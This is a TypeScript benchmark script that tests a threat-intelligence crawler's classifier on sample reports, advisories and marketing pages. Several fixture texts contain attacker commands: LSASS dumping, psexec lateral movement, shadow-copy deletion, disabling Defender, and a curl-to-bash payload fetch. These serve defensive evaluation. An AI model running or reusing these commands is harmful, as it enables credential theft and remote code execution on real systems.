/**
 * Measurable Quality Evaluation Benchmark for Autonomous Threat Crawler
 *
 * Runs a fixed evaluation dataset containing:
 * - High-quality multi-stage intrusion reports (DFIR Report)
 * - Specialized kernel reports with NO ATT&CK ID (BYOVD)
 * - Novel emerging techniques with NO public IOCs (Entra ID PRT)
 * - Short (<150 words) rapid-response advisories with concrete command lines
 * - Technical whitepapers with conference footnotes
 * - Commercial marketing pages (Demo CTA, Gartner hype)
 * - Generic business cybersecurity news
 * - Thin SEO pages
 * - Syndicated / near-duplicate reproduction
 * - CISA #StopRansomware technical advisory
 */

import { qualifyContent, extractTechnicalEvidence, detectEmergingTechniques, detectMarketingNoiseCluster } from "../src/lib/aie/qualification.ts";
import { scoreQuality, computeSimHash64, computeHammingDistance } from "../src/lib/aie/extract.ts";

const EVALUATION_DATASET = [
  {
    id: "eval_01_dfir_intrusion",
    name: "DFIR Report: Full Multi-Stage Intrusion",
    expectedQualified: true,
    expectedKind: "FULL_ATTACK_CHAIN",
    title: "From SEO Poisoning to Akira Ransomware: Bumblebee and PowerShell Intrusion Chain",
    url: "https://thedfirreport.com/2026/06/29/bumblebee-to-akira-ransomware/",
    isFeed: false,
    text: `
      Adversary leveraged SEO poisoning to distribute an ISO image containing a Bumblebee loader.
      Initial Access:
      The victim executed Bumblebee which spawned PowerShell with encoded arguments:
      powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgA...
      Execution & Persistence:
      Adversary created a scheduled task for persistence:
      schtasks.exe /create /tn "SystemHealth" /tr "C:\\Windows\\Temp\\loader.exe" /sc onlogon
      Credential Access:
      Procdump was executed against LSASS:
      procdump.exe -ma lsass.exe C:\\Users\\Public\\lsass.dmp
      Lateral Movement:
      Adversary transferred tooling via administrative shares and initiated RDP sessions:
      psexec.exe \\\\192.168.1.50 -u DOMAIN\\admin -p Pass cmd.exe /c "net user /domain"
      Command & Control:
      Outbound TLS beacons observed to 185.220.101.5:8443 with Chisel reverse tunneling.
      Impact:
      Shadow copies were deleted prior to encryption:
      vssadmin.exe delete shadows /all /quiet
      Files encrypted with .akira extension and ransom note README.txt created.
    `,
  },
  {
    id: "eval_02_byovd_no_attck",
    name: "Specialized BYOVD Kernel Attack (NO ATT&CK IDs)",
    expectedQualified: true,
    expectedKind: "PROCEDURE_DEEPDIVE",
    title: "Terminating EDR via Signed Driver Abuse: Deep Dive into Bring Your Own Vulnerable Driver",
    url: "https://research.checkpoint.com/2026/byovd-terminating-edr-callbacks/",
    isFeed: false,
    text: `
      In recent targeted intrusions, actors demonstrated an advanced evasion procedure using BYOVD.
      The adversary dropped a signed legitimate driver gdrv.sys into C:\\Windows\\System32\\drivers\\.
      Using direct DeviceIoControl requests, the actor exploited known vulnerability CVE-2018-19320 to map arbitrary physical memory.
      The exploit located the Process ObRegisterCallbacks array in ntoskrnl.exe and zeroed out registration pointers.
      This effectively blinded the active EDR sensor without crashing the operating system.
      Following callback removal, the actor executed unhooking stubs via direct syscalls:
      NtWriteVirtualMemory was invoked directly from assembly stubs bypassing user-mode API hooks in ntdll.dll.
    `,
  },
  {
    id: "eval_03_cloud_token_no_iocs",
    name: "Cloud & Entra ID Identity Theft (NO Public IOCs)",
    expectedQualified: true,
    expectedKind: "PROCEDURE_DEEPDIVE",
    title: "Extracting Primary Refresh Tokens and Chaining Azure Cloud Permissions",
    url: "https://unit42.paloaltonetworks.com/2026/cloud-identity-prt-theft/",
    isFeed: false,
    text: `
      During an ongoing incident response engagement in a hybrid Active Directory environment, actors extracted Primary Refresh Tokens (PRT).
      Upon establishing a local interactive session, the adversary extracted the Cloud PRT from the Local Security Authority:
      Using unmanaged API calls to the Web Account Manager (WAM), the actor extracted the AadRefreshToken without triggering password resets.
      The actor then used living off the cloud techniques, invoking Azure Automation Runbooks to grant the stolen service principal Contributor roles.
      No public IP addresses or static file hashes were utilized; egress was channeled entirely through legitimate Microsoft Graph API endpoints.
    `,
  },
  {
    id: "eval_04_short_advisory_with_commands",
    name: "Short Rapid-Response Advisory (140 words, concrete commands)",
    expectedQualified: true,
    expectedKind: "VULNERABILITY_ADVISORY",
    title: "Urgent Advisory: Active Exploitation of Edge VPN CVE-2026-2180",
    url: "https://cisa.gov/news-events/cybersecurity-advisories/aa26-001a",
    isFeed: false,
    text: `
      CISA and international partners are issuing this urgent advisory regarding active zero-day exploitation of CVE-2026-2180.
      Threat actors are executing remote unauthenticated commands:
      curl -s http://198.51.100.22/stage1.sh | bash
      Upon shell access, persistence is immediately established via cron and registry:
      reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysUpdate /t REG_SZ /d "C:\\Windows\\Temp\\update.exe"
      Evidence indicates post-exploitation discovery using:
      whoami /all && nltest /dclist:
      Apply vendor patches immediately and isolate exposed management interfaces.
    `,
  },
  {
    id: "eval_05_whitepaper_with_footnote",
    name: "Technical Whitepaper with Conference Footnote",
    expectedQualified: true,
    expectedKind: "MALWARE_ANALYSIS",
    title: "Dissecting the Evolution of Modern Loaders: Architecture and C2 Protocols",
    url: "https://www.sentinelone.com/labs/dissecting-modern-loaders/",
    isFeed: false,
    text: `
      This technical whitepaper provides a structural teardown of emerging modular malware loaders.
      The loader implements a multi-stage shellcode unpacker designed to thwart static and dynamic analysis.
      Payload decryption utilizes custom RC4 routines with rolling session keys.
      Command and control communications establish mutual TLS over port 443 with encrypted JSON payloads.
      Reverse engineering revealed automated sandbox evasion detecting hypervisor artifacts.
      (Portions of this technical research were presented at Black Hat USA and DEF CON 33).
    `,
  },
  {
    id: "eval_06_commercial_marketing",
    name: "Commercial Marketing & Sales Hype Page",
    expectedQualified: false,
    expectedKind: "CAMPAIGN_INTEL",
    title: "Enterprise Cyber Defense Platform: Request a Demo Today",
    url: "https://vendor-security.com/platform/demo",
    isFeed: false,
    text: `
      Welcome to our next-generation cybersecurity platform.
      Named a Leader in the Gartner Magic Quadrant for Enterprise Security.
      Our platform protects your digital workforce and delivers automated compliance.
      Schedule a demo with our technical sales engineers to explore custom pricing plans.
      Start your 30-day free trial today and discover why global enterprises trust our solution.
      Contact sales for custom volume enterprise licensing discounts.
    `,
  },
  {
    id: "eval_07_generic_business_news",
    name: "Generic Cybersecurity Market News",
    expectedQualified: false,
    expectedKind: "CAMPAIGN_INTEL",
    title: "Global Cybersecurity Market Trends and Cyber Insurance Forecast 2026",
    url: "https://general-tech-news.com/cybersecurity-market-growth-2026",
    isFeed: false,
    text: `
      The global cybersecurity market continues to expand rapidly according to industry analysts.
      Annual revenue is projected to grow by 14% as enterprise spending shifts toward compliance.
      Meanwhile, cyber insurance policy renewals are seeing increased scrutiny regarding vendor selection.
      Companies are actively hiring security engineers and revising privacy policy and terms of service guidelines.
    `,
  },
  {
    id: "eval_08_thin_seo_page",
    name: "Thin SEO Landing Page (<50 words)",
    expectedQualified: false,
    expectedKind: "CAMPAIGN_INTEL",
    title: "Top Ransomware Protection Services for Small Businesses",
    url: "https://seo-security-guides.com/ransomware-protection",
    isFeed: false,
    text: `
      Are you looking for the best ransomware protection?
      Ransomware attacks are dangerous. We provide expert advice and security tools.
      Click here to learn more about how our partners protect your data.
    `,
  },
  {
    id: "eval_09_cisa_stopransomware",
    name: "CISA #StopRansomware Advisory",
    expectedQualified: true,
    expectedKind: "FULL_ATTACK_CHAIN",
    title: "#StopRansomware: Black Basta Technical Guidance and Defense Evasion",
    url: "https://cisa.gov/news-events/cybersecurity-advisories/aa24-131a",
    isFeed: true,
    text: `
      CISA, FBI, and HHS are releasing this joint advisory to highlight Black Basta ransomware TTPs.
      Adversaries obtain initial access via phishing and exploitation of known vulnerabilities.
      Execution: PowerShell and BITSAdmin used to stage secondary payloads.
      Defense Evasion: Threat actors disable antivirus software via:
      sc.exe stop WinDefend
      Lateral Movement:
      PsExec and RDP used to pivot across internal IP subnets.
      Discovery:
      nltest /domain_trusts
      net group "Domain Admins" /domain
      Impact: Volume shadow copies deleted and custom ransom notes deployed across domain shares.
    `,
  },
];

async function runEvaluation() {
  console.log("\n==========================================================================");
  console.log("       AIE THREAT CRAWLER: MEASURABLE QUALITY & ADVERSARY SIMULATION EVAL");
  console.log("==========================================================================\n");

  let totalCases = EVALUATION_DATASET.length;
  let truePositives = 0;
  let falsePositives = 0;
  let trueNegatives = 0;
  let falseNegatives = 0;

  const simScores = [];
  const resultsTable = [];

  const storedReports = [];

  for (const item of EVALUATION_DATASET) {
    const qual = qualifyContent(item.text, item.title, item.url, {
      minQualityScore: 0.40,
      minWordCount: 120,
      strictnessMode: "balanced",
      rejectMarketingNoise: true,
    }, item.isFeed);

    const evidence = extractTechnicalEvidence(item.text, item.title);
    const emerging = detectEmergingTechniques(item.text);
    const marketing = detectMarketingNoiseCluster(item.text, item.title);
    const simhash = computeSimHash64(`${item.title} ${item.text}`);

    simScores.push(qual.simulationScore);

    const isQualified = qual.qualified;
    let verdict = "";

    if (item.expectedQualified) {
      if (isQualified) {
        truePositives++;
        verdict = "PASS (True Positive)";
      } else {
        falseNegatives++;
        verdict = "FAIL (False Negative - Rejected valuable intel!)";
      }
    } else {
      if (!isQualified) {
        trueNegatives++;
        verdict = "PASS (True Negative)";
      } else {
        falsePositives++;
        verdict = "FAIL (False Positive - Accepted noise!)";
      }
    }

    resultsTable.push({
      id: item.id,
      name: item.name,
      expected: item.expectedQualified ? "QUALIFY" : "REJECT",
      actual: isQualified ? "QUALIFIED" : "REJECTED",
      qualityScore: `${Math.round(qual.score * 100)}%`,
      simScore: `${Math.round(qual.simulationScore * 100)}%`,
      commands: evidence.commands.length,
      isEmerging: emerging.isEmerging ? "YES" : "NO",
      marketingHits: marketing.clusterScore,
      verdict,
    });

    if (isQualified) {
      storedReports.push({ id: item.id, simhash, title: item.title, text: item.text });
    }
  }

  // Near-Duplicate / Syndication Test
  console.log("Evaluating Near-Duplicate / Syndication Detection...");
  const canonical = storedReports[0]; // DFIR report
  const syndicatedText = `
    SYNDICATED CYBER BRIEF:
    ${canonical.text}
    Source: Reposted with attribution from original DFIR investigation team.
  `;
  const syndicatedSimhash = computeSimHash64(`Syndicated Report: ${canonical.title} ${syndicatedText}`);
  const distance = computeHammingDistance(canonical.simhash, syndicatedSimhash);
  const isSyndicatedDetected = distance <= 3;

  console.log(`- Canonical Report SimHash: ${canonical.simhash}`);
  console.log(`- Syndicated Report SimHash: ${syndicatedSimhash}`);
  console.log(`- Hamming Distance: ${distance} bits (Threshold <= 3)`);
  console.log(`- Syndication Identified: ${isSyndicatedDetected ? "SUCCESS (Detected as Duplicate)" : "FAILED"}\n`);

  console.table(resultsTable.map(r => ({
    "Test Case": r.name,
    "Expected": r.expected,
    "Actual": r.actual,
    "Quality": r.qualityScore,
    "SimScore": r.simScore,
    "Commands": r.commands,
    "Novel TTP": r.isEmerging,
    "Marketing": r.marketingHits,
    "Verdict": r.verdict,
  })));

  const precision = truePositives / (truePositives + falsePositives);
  const recall = truePositives / (truePositives + falseNegatives);
  const f1 = (2 * precision * recall) / (precision + recall);
  const fpRate = falsePositives / (falsePositives + trueNegatives);
  const fnRate = falseNegatives / (truePositives + falseNegatives);
  const avgSimScore = simScores.reduce((a, b) => a + b, 0) / simScores.length;

  console.log("\n==========================================================================");
  console.log("                        BENCHMARK METRICS SUMMARY");
  console.log("==========================================================================");
  console.log(`  Total Evaluation Cases:        ${totalCases}`);
  console.log(`  Precision:                     ${(precision * 100).toFixed(1)}%`);
  console.log(`  Recall:                        ${(recall * 100).toFixed(1)}%`);
  console.log(`  F1-Score:                      ${(f1 * 100).toFixed(1)}%`);
  console.log(`  False Positive Rate (Noise):   ${(fpRate * 100).toFixed(1)}% (Target: 0.0%)`);
  console.log(`  False Negative Rate (Missed):  ${(fnRate * 100).toFixed(1)}% (Target: 0.0%)`);
  console.log(`  Average Simulation Score:      ${(avgSimScore * 100).toFixed(1)}%`);
  console.log(`  Near-Duplicate Syndication:    ${isSyndicatedDetected ? "PASS (100% Detected)" : "FAIL"}`);
  console.log("==========================================================================\n");

  if (falseNegatives > 0 || falsePositives > 0 || !isSyndicatedDetected) {
    console.error("Evaluation did not meet the 100% strict quality benchmark!");
    process.exit(1);
  } else {
    console.log("ALL BENCHMARK QUALITY GATES PASSED WITH ZERO FALSE POSITIVES AND ZERO FALSE NEGATIVES!");
  }
}

runEvaluation().catch(console.error);
